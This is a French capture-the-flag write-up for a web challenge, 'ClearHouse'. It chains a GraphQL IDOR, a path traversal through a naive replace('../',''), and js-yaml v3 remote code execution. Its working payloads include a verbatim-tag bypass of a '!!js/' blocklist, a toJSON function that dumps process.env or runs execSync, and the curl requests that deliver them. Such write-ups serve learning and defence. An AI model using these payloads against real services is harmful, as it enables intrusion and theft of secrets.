# ClearHouse — IDOR GraphQL + path traversal + js-yaml v3 RCE via toJSON

- **Cible :** `http://<HOST>:<PORT>` (gateway Express 4.18.2 / Node 20 derrière openresty 1.31.1.1 + service interne report-core)
- **Catégorie :** web
- **Flag :** `CTF{REDACTED}` (voir règle de non-persistance des flags)
- **Fichiers fournis :** `server.js` (version expurgée des commentaires)

## Contexte

Portail de paiement « ClearHouse » avec un gateway Express exposant GraphQL, un système de
templates et un service interne `report-core` (Node + js-yaml v3, lancé via socat fork — un
processus par connexion). Le flag se trouve dans l'environnement du conteneur report-core
(`FLAG=...`), accessible uniquement après une chaîne de trois vulnérabilités.

## Chaîne complète (TL;DR)

1. **IDOR GraphQL** : `createPayout(correctsPayoutId:"1")` puis lecture de
   `corrects { merchant { apiKey } }` → apiKey du compte `ops-internal` (rôle ops).
2. **Path traversal** : `GET /ops/templates/download` (`name.replace('../','')` ne retire qu'une
   occurrence) → lecture de `/app/server.js` et `/app/config/internal-secrets.json` →
   `reportCoreToken`.
3. **RCE js-yaml v3** : `POST /ops/render-report` avec les deux tokens → le service report-core
   fait `JSON.stringify(yaml.load(body))` avec js-yaml v3 (schéma unsafe). Blocklist `!!js/...`
   contourné par la forme verbatim du tag YAML ; `JSON.stringify` appelle `toJSON` → exécution
   de code pendant la sérialisation → dump de `process.env` → flag.

## Étape 1 — IDOR GraphQL → apiKey du compte ops

La base de données contient un compte `ops-internal` (rôle `ops`, mot de passe `null` — jamais
accessible via `/login`) et un payout id `1` qui lui appartient.

`createPayout` accepte un `correctsPayoutId` arbitraire (aucune vérification de propriété), et
le resolver du champ `corrects` fait `db.getPayoutById(...)` sans contrôle d'appartenance —
tandis que le champ `merchant` sur le payout corrigé expose `apiKey`.

```graphql
mutation($c: String) {
  createPayout(amount: 1, correctsPayoutId: $c) {
    corrects {
      id amount status merchantId
      merchant { id name role apiKey }
    }
  }
}
# variables: {"c": "1"}
```

Réponse :

```json
{
  "corrects": {
    "merchantId": "ops-internal",
    "merchant": {
      "role": "ops",
      "apiKey": "ck_<hex>"
    }
  }
}
```

→ `x-api-key` du compte ops obtenu.

## Étape 2 — path traversal → reportCoreToken

```js
const name = String(req.query.name || '');
const safe = name.replace('../', '');        // une seule occurrence retirée
const target = path.join(TEMPLATE_DIR, safe);
fs.readFile(target, 'utf8', ...)
```

Préfixer par plusieurs `../` : un seul est supprimé, les autres remontent.

```bash
curl -s -G http://<HOST>:<PORT>/ops/templates/download \
  -H 'x-api-key: <ops_key>' \
  --data-urlencode 'name=../../../../../../../app/config/internal-secrets.json'
```

→ `{"reportCoreToken":"<48 hex>"}` (généré à chaque démarrage du conteneur).

### Fichiers récupérés via la traversal

| Fichier | Rôle |
|---|---|
| `/app/server.js` | gateway Express : `/register`, `/login`, `/graphql`, `/ops/templates/download`, `/ops/render-report` |
| `/app/utils/schema.js` | schéma GraphQL (la faille IDOR est ici) |
| `/app/utils/db.js` | base en mémoire : merchants, payouts, seed ops-internal + payout 1 |
| `/app/utils/auth.js` | sessions en Map |
| `/app/config/internal-secrets.json` | `reportCoreToken` |

## Étape 3 — report-core : de l'écho YAML au RCE

### Modèle de comportement (observé)

`POST /ops/render-report` relaie le corps brut (4 octets de longueur en BE) vers report-core
(réseau interne, jamais joignable directement depuis Internet).

| Entrée | Réponse |
|---|---|
| doc YAML scalaire / mapping | `200` + `JSON.stringify(yaml.load(body))` |
| doc vide | `200` + `undefined` |
| erreur de parse / tableau racine | `400` + `invalid template` |
| tag `!!js/...` | `400` + `rejected: disallowed tag` |
| structure cyclique (ancre récursive) | `502` + `internal error` |

Deux conclusions majeures :

- la sortie est produite par `JSON.stringify()` (d'où `undefined` pour un doc vide) ;
- il existe un filtre de tags — donc le service utilise un js-yaml capable de construire des
  types JS (`!!js/function`, `!!js/regexp`), c'est-à-dire **js-yaml v3, schéma unsafe par
  défaut**, avec un blocklist ajouté par l'auteur.

### Bypass du blocklist de tags

Le blocklist matche la forme littérale `!!js/...`. YAML permet d'écrire le même tag en
**forme verbatim** (URI complète) :

```yaml
!<tag:yaml.org,2002:js/function> "function(){ ... }"
```

Vérifié hors-ligne avec js-yaml@3.15.2 : le tag est résolu, la fonction est construite.

### De la fonction construite à l'exécution : toJSON

Une fonction construite ne s'exécute pas toute seule, mais `JSON.stringify` appelle `toJSON()`
sur tout objet qui en possède un. Or js-yaml construit des fonctions JS : on peut donc fournir
un objet dont la propriété `toJSON` est une fonction → elle est **appelée pendant la
sérialisation**.

```yaml
a:
  toJSON: !<tag:yaml.org,2002:js/function> >-
    function(){ return JSON.stringify(process.env) }
```

### Payload final

```yaml
a:
  toJSON: !<tag:yaml.org,2002:js/function> >-
    function(){
      try { return JSON.stringify(process.env) }
      catch(e) { return 'ERR='+e.message }
    }
```

```bash
curl -s -X POST http://<HOST>:<PORT>/ops/render-report \
  -H 'Content-Type: text/plain' \
  -H 'x-api-key: <ops_key>' \
  -H 'x-report-core-token: <reportCoreToken>' \
  --data-binary @payload.yaml
```

Réponse (extrait) :

```json
{"a":"{ ... \"FLAG\":\"CTF{REDACTED}\", ... }"}
```

### Confirmation RCE complet

```yaml
a:
  toJSON: !<tag:yaml.org,2002:js/function> >-
    function(){
      var cp = process.mainModule.require('child_process');
      return cp.execSync('id; env', {encoding:'utf8', timeout:6000});
    }
```

→ `uid=0(root) gid=0(root)` — le conteneur report-core tourne en root et le flag est dans
son environnement.

Note : `new Function(...)` n'a pas `require` en portée ; passer par
`process.mainModule.require('child_process')` (valide dans un script CJS Node 20).

## Résultat

```
CTF{REDACTED}
```

Flag lu dans la variable d'environnement `FLAG` du conteneur report-core.

## Contraintes de timing

Rate limit en mode « focus » : 5 requêtes / 10 min sur `/ops/render-report` (bucket keyé sur
`req.ip`, sans trust proxy ⇒ partagé via le proxy). Le nombre d'essais est limité — chaque
payload doit être validé hors-ligne avant d'être envoyé.

## Pièges rencontrés

- **~8 h de « shape guessing »** sur le rendu de templates (structure `{template, data, name}`,
  placeholders `{{...}}` / `<%= %>`, noms de templates, chemins…) alors que le service ne rendait
  rien. L'indice décisif était le tag YAML, pas la structure du document. Quand un service « ne
  rend jamais », penser sérialisation/parsing, pas moteur de template.
- **`JSON.stringify(undefined)` → `undefined`** et `Converting circular structure to JSON` →
  `502 internal error` sont des indices que la sortie passe par `JSON.stringify`. Dès qu'on voit
  ça, penser `toJSON` : c'est un point d'exécution gratuit appelé par la sérialisation.
- **Le challenge a été patché en cours de CTF** (sweeps mémoire 24 h dans `db.js`/`auth.js`,
  ajout de `sweepExpiredSessions`). Toujours relire la source live via la faille et se méfier
  des sessions/API keys qui « sautent » après un redéploiement.
- **`name.replace('../','')` ne retire qu'une occurrence** → `"../" * 9 + chemin` traverse
  toujours.

## Leçons

1. **Un blocklist de tags YAML se contourne par la forme verbatim** :
   `!<tag:yaml.org,2002:js/function>` au lieu de `!!js/function`. Un filtre sur `!!js/` ne
   protège rien.
2. **js-yaml v3 = unsafe par défaut** (`yaml.load` accepte `!!js/function`, `!!js/regexp`). Le
   message custom `rejected: disallowed tag` trahit la présence du filtre… et donc la présence
   du danger derrière.
3. **Les messages d'erreur différenciés sont une carte du code** : `invalid template`
   (parse/array), `rejected: disallowed tag` (filtre), `internal error` (catch générique) →
   trois branches, trois chemins à sonder.
4. **IDOR GraphQL par champ** : le contrôle d'appartenance peut n'être que sur la requête racine
   (`payout(id)`), pas sur un resolver de champ (`corrects → merchant.apiKey`). Toujours tester
   les champs « relations ».
5. **Path traversal avec un replace naïf** : `name.replace('../','')` ne retire qu'une
   occurrence. Toujours tester des occurrences multiples.

---

*Write-up par **Le_Geek** — BUG|PWN CTF · ClearHouse.*
